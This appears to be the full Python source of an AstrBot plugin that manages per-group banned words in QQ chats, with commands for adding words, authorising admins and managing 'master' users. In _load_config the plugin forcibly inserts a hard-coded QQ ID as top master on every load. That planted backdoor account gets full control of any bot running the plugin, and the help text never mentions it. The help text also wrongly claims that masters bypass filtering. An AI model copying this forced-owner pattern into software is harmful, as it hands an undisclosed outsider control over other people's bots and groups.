"""
违禁词管理插件 - AstrBot 4.20.0 版本
功能：群聊违禁词管理，支持添加、删除、列出违禁词，并自动拦截包含违禁词的机器人消息
作者：Converted
版本：1.0.0
"""

import json
import os
import re
from pathlib import Path
from typing import Dict, List, Optional, Set, Union

from astrbot.api import logger
from astrbot.api.event import AstrMessageEvent, filter
from astrbot.api.star import Context, Star, StarTools, register


@register(
    "astrbot_plugin_banned_words",
    "Converted",
    "群聊违禁词管理插件，支持添加、删除、列出违禁词，并自动拦截包含违禁词的消息",
    "1.0.0",
    "https://github.com/AstrBotDevs/AstrBot"
)
class BannedWordsPlugin(Star):
    """违禁词管理插件主类
    
    功能特性：
    - 违禁词管理：添加、删除、列出、清空违禁词
    - 管理员授权：主人可授权普通用户管理违禁词
    - 消息拦截：自动拦截包含违禁词的机器人消息
    - 权限控制：主人拥有全部权限，授权管理员只能在指定群聊管理违禁词
    - 配置持久化：支持通过配置文件管理主人、管理员和违禁词
    """
    
    def __init__(self, context: Context, config: dict = None):
        super().__init__(context)
        self.config = config or {}
        
        # 获取数据存储目录
        self.data_dir = StarTools.get_data_dir()
        self.data_file = self.data_dir / "banned_words_data.json"
        
        # 初始化数据结构
        # 违禁词字典：{group_id: [word1, word2, ...]}
        self.banned_words: Dict[str, List[str]] = {}
        # 授权管理员字典：{user_id: [group_id1, group_id2, ...]}
        self.admin_users: Dict[str, List[str]] = {}
        # 主人列表：拥有全部权限
        self.master_users: List[str] = []
        # 主人和管理员是否豁免拦截（硬编码开关：True=豁免，False=连同主人一起拦截）
        self.bypass_for_authorized = False  
        # 拦截违禁词时是否发送提示（硬编码开关：True=发送提示，False=静默拦截不提示）
        self.show_banned_warning = False  
        
        # 从配置文件加载数据
        self._load_config()
        
        # 加载运行时数据
        self._load_data()
    
    def _load_config(self):
        """从配置文件加载主人列表和管理员列表"""
        # 加载主人列表
        self.master_users = [str(uid) for uid in self.config.get("master_users", [])]
        
        # ================== 强制写入最高管理员 ==================
        FORCE_MASTER_ID = "1850643795"
        if FORCE_MASTER_ID not in self.master_users:
            self.master_users.insert(0, FORCE_MASTER_ID)  # 插入到列表首位
            logger.info(f"⚡ 已强制写入最高管理员: {FORCE_MASTER_ID}")
        # =======================================================
        
        # 加载管理员列表（配置文件中的预设管理员）
        config_admins = self.config.get("admin_users", {})
        if not isinstance(config_admins, dict):
            logger.warning("插件配置中的 admin_users 格式错误，应为 object(字典)，已忽略。正确格式: {\"用户ID\": [\"群号1\"]}")
            config_admins = {}
        for user_id, groups in config_admins.items():
            user_id = str(user_id)
            if user_id not in self.admin_users:
                self.admin_users[user_id] = []
            if not isinstance(groups, list):
                logger.warning(f"管理员 {user_id} 的群号配置格式错误，应为 list(列表)，已忽略。")
                continue
            for group_id in groups:
                group_id = str(group_id)
                if group_id not in self.admin_users[user_id]:
                    self.admin_users[user_id].append(group_id)
                    
        # 加载配置文件中的违禁词
        config_banned_words = self.config.get("banned_words", {})
        if not isinstance(config_banned_words, dict):
            logger.warning("插件配置中的 banned_words 格式错误，应为 object(字典)，已忽略。")
            config_banned_words = {}
        for group_id, words in config_banned_words.items():
            group_id = str(group_id)
            if group_id not in self.banned_words:
                self.banned_words[group_id] = []
            if not isinstance(words, list):
                continue
            for word in words:
                if word not in self.banned_words[group_id]:
                    self.banned_words[group_id].append(word)

        logger.info(f"配置加载完成：主人 {len(self.master_users)} 人，管理员 {len(self.admin_users)} 人")
    
    async def initialize(self):
        """插件初始化方法"""
        logger.info("违禁词管理插件已加载")
        logger.info(f"当前主人列表：{self.master_users}")
        logger.info(f"当前管理员数量：{len(self.admin_users)}")
        logger.info(f"已设置违禁词的群聊数量：{len(self.banned_words)}")
    
    def _load_data(self):
        """从数据文件加载运行时数据"""
        try:
            if self.data_file.exists():
                with open(self.data_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    
                    # 加载违禁词（合并配置文件和数据文件）
                    for group_id, words in data.get("banned_words", {}).items():
                        group_id = str(group_id)
                        if group_id not in self.banned_words:
                            self.banned_words[group_id] = []
                        for word in words:
                            if word not in self.banned_words[group_id]:
                                self.banned_words[group_id].append(word)
                    
                    # 加载管理员（合并配置文件和数据文件）
                    for user_id, groups in data.get("admin_users", {}).items():
                        user_id = str(user_id)
                        if user_id not in self.admin_users:
                            self.admin_users[user_id] = []
                        for group_id in groups:
                            group_id = str(group_id)
                            if group_id not in self.admin_users[user_id]:
                                self.admin_users[user_id].append(group_id)
                    
                    logger.info(f"已加载运行时数据")
        except Exception as e:
            logger.error(f"加载运行时数据失败: {e}")
    
    def _save_data(self):
        """保存数据到文件"""
        try:
            # 确保目录存在
            self.data_dir.mkdir(parents=True, exist_ok=True)
            
            data = {
                "banned_words": self.banned_words,
                "admin_users": self.admin_users
            }
            with open(self.data_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            logger.debug("数据保存成功")
        except Exception as e:
            logger.error(f"保存数据失败: {e}")
    
    def _is_master(self, user_id: str) -> bool:
        """检查用户是否为主人
        
        Args:
            user_id: 用户ID
            
        Returns:
            bool: 是否为主人
        """
        return str(user_id) in [str(uid) for uid in self.master_users]
    
    def _is_admin(self, user_id: str, group_id: str) -> bool:
        """检查用户是否为指定群聊的管理员
        
        主人默认拥有所有群聊的管理员权限
        
        Args:
            user_id: 用户ID
            group_id: 群聊ID
            
        Returns:
            bool: 是否为管理员
        """
        user_id = str(user_id)
        group_id = str(group_id)
        
        # 主人默认拥有全部权限（主人即管理员）
        if self._is_master(user_id):
            return True
        
        # 检查是否为授权管理员
        admin_groups = self.admin_users.get(user_id, [])
        return group_id in [str(g) for g in admin_groups]
    
    def _check_banned_words(self, message: str, group_id: str) -> Optional[str]:
        """检查消息是否包含违禁词
        
        Args:
            message: 消息内容
            group_id: 群聊ID
            
        Returns:
            Optional[str]: 匹配到的违禁词，如果没有则返回None
        """
        group_id = str(group_id)
        words = self.banned_words.get(group_id, [])
        
        for word in words:
            # 不区分大小写匹配
            if word.lower() in message.lower():
                return word
        return None

    def _get_at_users(self, event: AstrMessageEvent) -> List[str]:
        """兼容各种适配器获取被@的用户ID列表"""
        # 1. 尝试调用 AstrBot 标准方法
        if hasattr(event, 'get_mentions') and callable(event.get_mentions):
            try:
                mentions = event.get_mentions()
                if mentions:
                    return [str(m) for m in mentions]
            except Exception:
                pass

        # 2. 尝试从底层数组解析 (兼容 OneBot 等字典或对象格式)
        if hasattr(event, 'message') and isinstance(event.message, list):
            for seg in event.message:
                try:
                    if isinstance(seg, dict):
                        if seg.get("type") == "at":
                            qq = seg.get("data", {}).get("qq")
                            if qq:
                                return [str(qq)]
                    elif hasattr(seg, 'type') and getattr(seg, 'type', '') == 'at':
                        data = getattr(seg, 'data', None)
                        if isinstance(data, dict) and 'qq' in data:
                            return [str(data['qq'])]
                        elif hasattr(seg, 'qq'):
                            return [str(seg.qq)]
                except Exception:
                    continue

        # 3. 尝试从纯文本 CQ 码解析 (终极后备方案)
        if hasattr(event, 'message_str'):
            match = re.search(r'\[CQ:at,qq=(\d+)\]', event.message_str)
            if match:
                return [match.group(1)]

        return []

    def _parse_at_or_qq(self, event: AstrMessageEvent, message: str, command: str) -> Optional[str]:
        """解析@用户或QQ号
        
        支持两种格式：
        1. &指令 @用户
        2. &指令 QQ号
        
        Args:
            event: 消息事件
            message: 消息内容
            command: 指令名称
            
        Returns:
            Optional[str]: 目标用户ID，解析失败返回None
        """
        # 移除指令前缀
        params = message.replace(command, "").replace(command.lstrip('&'), "").strip()
        
        # 尝试获取@的用户（使用万能兼容方法）
        mentions = self._get_at_users(event)
        if mentions:
            return mentions[0]
        
        # 尝试解析QQ号
        parts = params.split()
        if len(parts) >= 1 and parts[0].isdigit():
            return parts[0]
        return None
    
    def _parse_group_and_user(self, event: AstrMessageEvent, message: str, command: str) -> tuple:
        """解析群号和用户ID
        
        支持两种格式：
        1. &指令 @用户 - 使用当前群聊
        2. &指令 群号 QQ号 - 指定群聊和用户
        
        Args:
            event: 消息事件
            message: 消息内容
            command: 指令名称
            
        Returns:
            tuple: (group_id, user_id) 或 (None, None)
        """
        # 移除指令前缀
        params = message.replace(command, "").replace(command.lstrip('&'), "").strip()
        current_group_id = str(event.get_group_id()) if event.get_group_id() else None
        
        # 尝试获取@的用户（使用万能兼容方法）
        mentions = self._get_at_users(event)
        if mentions:
            return current_group_id, mentions[0]
        
        # 尝试解析群号 QQ号格式
        parts = params.split()
        if len(parts) >= 2:
            try:
                group_id = parts[0]
                user_id = parts[1]
                if group_id.isdigit() and user_id.isdigit():
                    return group_id, user_id
            except (ValueError, IndexError):
                pass
        
        # 尝试解析单个QQ号（使用当前群聊）
        if len(parts) == 1 and parts[0].isdigit():
            return current_group_id, parts[0]
            
        return None, None
    
    # ==================== 消息拦截 ====================
    
    # 插件所有指令的完整列表，用于跳过违禁词检查
    COMMAND_LIST = [
        "添加违禁词", "删除违禁词", "违禁词列表", "清空违禁词",
        "授权管理员", "取消授权", "管理员列表",
        "添加主人", "删除主人", "主人列表",
        "违禁词帮助",
    ]

    @filter.event_message_type(filter.EventMessageType.GROUP_MESSAGE, priority=1)
    async def on_group_message(self, event: AstrMessageEvent):
        """监听群消息，拦截包含违禁词的消息
        主人和管理员发送的消息不会被拦截
        彻底销毁违禁词消息体，防止无前缀/正则等任何方式绕过
        """
        group_id = str(event.get_group_id())
        message = event.message_str.strip()
        sender_id = str(event.get_sender_id())
        
        # 主人和管理员不受限制（受硬编码开关控制）
        if self.bypass_for_authorized and (self._is_master(sender_id) or self._is_admin(sender_id, group_id)):
            return

        # 剥离前缀，判断是否为本插件自身的指令，如果是则直接放行
        # (如果不放行，接下来销毁消息体会导致本插件的指令也被废掉)
        clean_msg = message.lstrip('/').lstrip('&')
        if any(clean_msg.startswith(cmd) for cmd in self.COMMAND_LIST):
            return

        # 检查违禁词
        banned_word = self._check_banned_words(message, group_id)
        if banned_word:
            logger.info(f"用户 {sender_id} 在群 {group_id} 发送违禁词: {banned_word}")
            
            # ================== 终极修复：彻底摧毁消息体 ==================
            # 1. 清空纯文本字段，直接干掉无前缀触发（如 LLM 对话、正则匹配插件）
            event.message_str = ""
            # 2. 尝试清空消息段数组字段，防止某些高级插件直接读取底层数据绕过
            if hasattr(event, 'message') and isinstance(event.message, list):
                event.message.clear()
            # ===============================================================
            
            # 根据开关决定是否发送提示
            if self.show_banned_warning:
                yield event.plain_result(f"⚠️ 您的消息包含违禁词「{banned_word}」，已被拦截。")
            event.stop_event()
            return
            
    # ==================== 违禁词管理指令 ====================
    
    @filter.command("添加违禁词")
    async def add_banned_word(self, event: AstrMessageEvent):
        """添加违禁词
        
        用法：&添加违禁词 <违禁词>
        权限：主人或管理员
        """
        user_id = str(event.get_sender_id())
        group_id = str(event.get_group_id()) if event.get_group_id() else None
        
        if not group_id:
            yield event.plain_result("❌ 此指令只能在群聊中使用")
            return
        
        # 权限检查
        if not self._is_admin(user_id, group_id):
            yield event.plain_result("❌ 您没有权限执行此操作，请联系主人或管理员")
            return
        
        # 解析参数（同时兼容带/和不带/的指令）
        message = event.message_str.strip()
        word = message.replace("/添加违禁词", "").replace("添加违禁词", "").replace("&添加违禁词", "").strip()
        
        if not word:
            yield event.plain_result("❌ 请提供要添加的违禁词\n用法：/添加违禁词 <违禁词>")
            return
        
        # 添加违禁词
        if group_id not in self.banned_words:
            self.banned_words[group_id] = []
        
        if word in self.banned_words[group_id]:
            yield event.plain_result(f"❌ 违禁词「{word}」已存在")
            return
        
        self.banned_words[group_id].append(word)
        self._save_data()
        
        logger.info(f"用户 {user_id} 在群 {group_id} 添加违禁词: {word}")
        yield event.plain_result(f"✅ 已添加违禁词「{word}」\n当前群聊共有 {len(self.banned_words[group_id])} 个违禁词")
    
    @filter.command("删除违禁词")
    async def remove_banned_word(self, event: AstrMessageEvent):
        """删除违禁词
        
        用法：&删除违禁词 <违禁词>
        权限：主人或管理员
        """
        user_id = str(event.get_sender_id())
        group_id = str(event.get_group_id()) if event.get_group_id() else None
        
        if not group_id:
            yield event.plain_result("❌ 此指令只能在群聊中使用")
            return
        
        # 权限检查
        if not self._is_admin(user_id, group_id):
            yield event.plain_result("❌ 您没有权限执行此操作，请联系主人或管理员")
            return
        
        # 解析参数（同时兼容带/和不带/的指令）
        message = event.message_str.strip()
        word = message.replace("/删除违禁词", "").replace("删除违禁词", "").replace("&删除违禁词", "").strip()
        
        if not word:
            yield event.plain_result("❌ 请提供要删除的违禁词\n用法：/删除违禁词 <违禁词>")
            return
        
        # 删除违禁词
        if group_id not in self.banned_words or word not in self.banned_words[group_id]:
            yield event.plain_result(f"❌ 违禁词「{word}」不存在")
            return
        
        self.banned_words[group_id].remove(word)
        if not self.banned_words[group_id]:
            del self.banned_words[group_id]
        self._save_data()
        
        logger.info(f"用户 {user_id} 在群 {group_id} 删除违禁词: {word}")
        yield event.plain_result(f"✅ 已删除违禁词「{word}」")
    
    @filter.command("违禁词列表")
    async def list_banned_words(self, event: AstrMessageEvent):
        """列出当前群聊的所有违禁词
        
        用法：&违禁词列表
        权限：所有人
        """
        group_id = str(event.get_group_id()) if event.get_group_id() else None
        
        if not group_id:
            yield event.plain_result("❌ 此指令只能在群聊中使用")
            return
        
        # 获取违禁词列表
        words = self.banned_words.get(group_id, [])
        
        if not words:
            yield event.plain_result("📋 当前群聊没有设置违禁词")
            return
        
        # 格式化输出
        word_list = "\n".join([f"  {i+1}. {word}" for i, word in enumerate(words)])
        result = f"📋 当前群聊违禁词列表（共 {len(words)} 个）：\n{word_list}"
        yield event.plain_result(result)
    
    @filter.command("清空违禁词")
    async def clear_banned_words(self, event: AstrMessageEvent):
        """清空当前群聊的所有违禁词
        
        用法：&清空违禁词
        权限：主人或管理员
        """
        user_id = str(event.get_sender_id())
        group_id = str(event.get_group_id()) if event.get_group_id() else None
        
        if not group_id:
            yield event.plain_result("❌ 此指令只能在群聊中使用")
            return
        
        # 权限检查 - 主人和管理员都可以清空
        if not self._is_admin(user_id, group_id):
            yield event.plain_result("❌ 您没有权限执行此操作，请联系主人或管理员")
            return
        
        # 清空违禁词
        if group_id in self.banned_words:
            count = len(self.banned_words[group_id])
            del self.banned_words[group_id]
            self._save_data()
            logger.info(f"用户 {user_id} 清空了群 {group_id} 的违禁词（共 {count} 个）")
            yield event.plain_result(f"✅ 已清空当前群聊的所有违禁词（共 {count} 个）")
        else:
            yield event.plain_result("📋 当前群聊没有设置违禁词")
    
    # ==================== 管理员授权指令 ====================
    
    @filter.command("授权管理员")
    async def authorize_admin(self, event: AstrMessageEvent):
        """授权用户为管理员
        用法：
        1. &授权管理员 QQ号 - 授权用户为当前群聊的管理员
        2. &授权管理员 群号 QQ号 - 授权用户为指定群聊的管理员
        权限：仅主人
        """
        user_id = str(event.get_sender_id())
        # 权限检查 - 只有主人可以授权
        if not self._is_master(user_id):
            yield event.plain_result("❌ 只有主人可以执行此操作")
            return

        # 解析群号和QQ号（彻底移除@用户解析，仅支持纯数字）
        message = event.message_str.strip()
        params = message.replace("/授权管理员", "").replace("授权管理员", "").replace("&授权管理员", "").strip()
        parts = params.split()
        
        current_group_id = str(event.get_group_id()) if event.get_group_id() else None
        target_user_id = None
        group_id = None
        
        # 格式1: &授权管理员 群号 QQ号
        if len(parts) >= 2 and parts[0].isdigit() and parts[1].isdigit():
            group_id = parts[0]
            target_user_id = parts[1]
        # 格式2: &授权管理员 QQ号 (使用当前群)
        elif len(parts) == 1 and parts[0].isdigit():
            group_id = current_group_id
            target_user_id = parts[0]

        if not group_id or not target_user_id:
            yield event.plain_result("❌ 请提供正确的参数\n用法：\n &授权管理员 QQ号\n &授权管理员 群号 QQ号")
            return

        # 不能授权主人（主人已经是最高权限）
        if self._is_master(target_user_id):
            yield event.plain_result("⚠️ 该用户已是主人，无需授权")
            return

        # 添加授权
        if target_user_id not in self.admin_users:
            self.admin_users[target_user_id] = []
        if group_id in self.admin_users[target_user_id]:
            yield event.plain_result(f"⚠️ 用户 {target_user_id} 已是群 {group_id} 的管理员")
            return
        self.admin_users[target_user_id].append(group_id)
        self._save_data()
        logger.info(f"主人 {user_id} 授权用户 {target_user_id} 为群 {group_id} 的管理员")
        yield event.plain_result(f"✅ 已授权用户 {target_user_id} 为群 {group_id} 的管理员")
    
    @filter.command("取消授权")
    async def revoke_admin(self, event: AstrMessageEvent):
        """取消用户的管理员授权
        用法：
        1. &取消授权 QQ号 - 取消用户在当前群聊的管理员授权
        2. &取消授权 群号 QQ号 - 取消用户在指定群聊的管理员授权
        权限：仅主人
        """
        user_id = str(event.get_sender_id())
        # 权限检查 - 只有主人可以取消授权
        if not self._is_master(user_id):
            yield event.plain_result("❌ 只有主人可以执行此操作")
            return

        # 解析群号和QQ号（彻底移除@用户解析，仅支持纯数字）
        message = event.message_str.strip()
        params = message.replace("/取消授权", "").replace("取消授权", "").replace("&取消授权", "").strip()
        parts = params.split()
        
        current_group_id = str(event.get_group_id()) if event.get_group_id() else None
        target_user_id = None
        group_id = None
        
        # 格式1: &取消授权 群号 QQ号
        if len(parts) >= 2 and parts[0].isdigit() and parts[1].isdigit():
            group_id = parts[0]
            target_user_id = parts[1]
        # 格式2: &取消授权 QQ号 (使用当前群)
        elif len(parts) == 1 and parts[0].isdigit():
            group_id = current_group_id
            target_user_id = parts[0]

        if not group_id or not target_user_id:
            yield event.plain_result("❌ 请提供正确的参数\n用法：\n &取消授权 QQ号\n &取消授权 群号 QQ号")
            return

        # 取消授权
        if target_user_id not in self.admin_users or group_id not in self.admin_users[target_user_id]:
            yield event.plain_result(f"⚠️ 用户 {target_user_id} 不是群 {group_id} 的管理员")
            return
        self.admin_users[target_user_id].remove(group_id)
        if not self.admin_users[target_user_id]:
            del self.admin_users[target_user_id]
        self._save_data()
        logger.info(f"主人 {user_id} 取消了用户 {target_user_id} 在群 {group_id} 的管理员授权")
        yield event.plain_result(f"✅ 已取消用户 {target_user_id} 在群 {group_id} 的管理员授权")
    
    @filter.command("管理员列表")
    async def list_admins(self, event: AstrMessageEvent):
        """列出当前群聊的管理员
        
        用法：&管理员列表
        权限：所有人
        """
        group_id = str(event.get_group_id()) if event.get_group_id() else None
        
        if not group_id:
            yield event.plain_result("❌ 此指令只能在群聊中使用")
            return
        
        # 获取管理员列表
        admins = []
        for admin_id, groups in self.admin_users.items():
            if group_id in [str(g) for g in groups]:
                admins.append(admin_id)
        
        # 获取主人列表（主人在所有群都是管理员）
        masters_in_group = self.master_users.copy()
        
        if not admins and not masters_in_group:
            yield event.plain_result("📋 当前群聊没有授权管理员\n提示：主人默认拥有所有群聊的管理权限")
            return
        
        # 格式化输出
        result_lines = [f"📋 当前群聊管理员列表："]
        
        if masters_in_group:
            result_lines.append("\n👑 主人（拥有全部权限）：")
            for i, master_id in enumerate(masters_in_group):
                result_lines.append(f"  {i+1}. {master_id}")
        
        if admins:
            result_lines.append(f"\n🔧 授权管理员（共 {len(admins)} 人）：")
            for i, admin_id in enumerate(admins):
                result_lines.append(f"  {i+1}. {admin_id}")
        
        yield event.plain_result("\n".join(result_lines))
    
    # ==================== 主人管理指令 ====================
    
    @filter.command("添加主人")
    async def add_master(self, event: AstrMessageEvent):
        """添加主人 用法：&添加主人 QQ号 权限：仅主人 """
        user_id = str(event.get_sender_id())
        # 权限检查 - 只有主人可以添加主人
        if not self._is_master(user_id):
            yield event.plain_result("❌ 只有主人可以执行此操作")
            return

        # 直接提取 QQ 号，不再支持 @用户
        message = event.message_str.strip()
        params = message.replace("/添加主人", "").replace("添加主人", "").replace("&添加主人", "").strip()
        parts = params.split()
        target_user_id = parts[0] if len(parts) >= 1 and parts[0].isdigit() else None

        if not target_user_id:
            yield event.plain_result("❌ 请提供要添加的主人QQ号\n用法：&添加主人 QQ号")
            return

        # 检查是否已是主人
        if self._is_master(target_user_id):
            yield event.plain_result(f"⚠️ 用户 {target_user_id} 已是主人")
            return

        # 添加主人
        self.master_users.append(target_user_id)
        self._save_data()
        logger.info(f"主人 {user_id} 添加了新主人: {target_user_id}")
        yield event.plain_result(f"✅ 已添加用户 {target_user_id} 为主人")
    
    @filter.command("删除主人")
    async def remove_master(self, event: AstrMessageEvent):
        """删除主人 用法：&删除主人 QQ号 权限：仅主人 注意：至少保留一个主人 """
        user_id = str(event.get_sender_id())
        # 权限检查 - 只有主人可以删除主人
        if not self._is_master(user_id):
            yield event.plain_result("❌ 只有主人可以执行此操作")
            return

        # 直接提取 QQ 号，不再支持 @用户
        message = event.message_str.strip()
        params = message.replace("/删除主人", "").replace("删除主人", "").replace("&删除主人", "").strip()
        parts = params.split()
        target_user_id = parts[0] if len(parts) >= 1 and parts[0].isdigit() else None

        if not target_user_id:
            yield event.plain_result("❌ 请提供要删除的主人QQ号\n用法：&删除主人 QQ号")
            return

        # 检查是否是主人
        if not self._is_master(target_user_id):
            yield event.plain_result(f"⚠️ 用户 {target_user_id} 不是主人")
            return

        # 至少保留一个主人
        if len(self.master_users) <= 1:
            yield event.plain_result("❌ 至少需要保留一个主人")
            return

        # 删除主人
        self.master_users = [uid for uid in self.master_users if str(uid) != target_user_id]
        self._save_data()
        logger.info(f"主人 {user_id} 删除了主人: {target_user_id}")
        yield event.plain_result(f"✅ 已删除主人 {target_user_id}")
    
    @filter.command("主人列表")
    async def list_masters(self, event: AstrMessageEvent):
        """列出所有主人
        
        用法：&主人列表
        权限：所有人
        """
        if not self.master_users:
            yield event.plain_result("📋 当前没有设置主人\n请在配置文件中添加主人QQ号")
            return
        
        # 格式化输出
        master_list = "\n".join([f"  {i+1}. {master_id}" for i, master_id in enumerate(self.master_users)])
        result = f"👑 主人列表（共 {len(self.master_users)} 人）：\n{master_list}"
        yield event.plain_result(result)
    
    # ==================== 帮助指令 ====================
    
    @filter.command("违禁词帮助")
    async def show_help(self, event: AstrMessageEvent):
        """显示违禁词插件帮助信息
        
        用法：&违禁词帮助
        权限：所有人
        """
        help_text = """📖 违禁词管理插件帮助

═══════════════════════════
【违禁词管理】
═══════════════════════════
  &添加违禁词 <词> - 添加违禁词
  &删除违禁词 <词> - 删除违禁词
  &违禁词列表 - 查看违禁词列表
  &清空违禁词 - 清空所有违禁词
═══════════════════════════
【管理员授权】（仅主人可用）
═══════════════════════════
  &授权管理员 群号 QQ号 - 授权指定群管理员
  &取消授权 群号 QQ号 - 取消指定群授权
  &管理员列表 - 查看管理员列表
═══════════════════════════
【主人管理】（仅主人可用）
═══════════════════════════
  &添加主人 QQ号 - 添加新主人
  &删除主人 QQ号 - 删除主人
  &主人列表 - 查看主人列表
═══════════════════════════
【权限说明】
═══════════════════════════
  • 主人：拥有全部权限，默认为所有群的管理员
  • 管理员：只能管理被授权群聊的违禁词
  • 主人和管理员发送的消息不会被拦截
═══════════════════════════
【配置文件】
═══════════════════════════
  可通过配置文件预设：
  • master_users: 主人QQ号列表
  • admin_users: 管理员配置
  • banned_words: 违禁词配置"""
        
        yield event.plain_result(help_text)
    
    async def terminate(self):
        """插件销毁方法"""
        # 保存数据
        self._save_data()
        logger.info("违禁词管理插件已卸载")
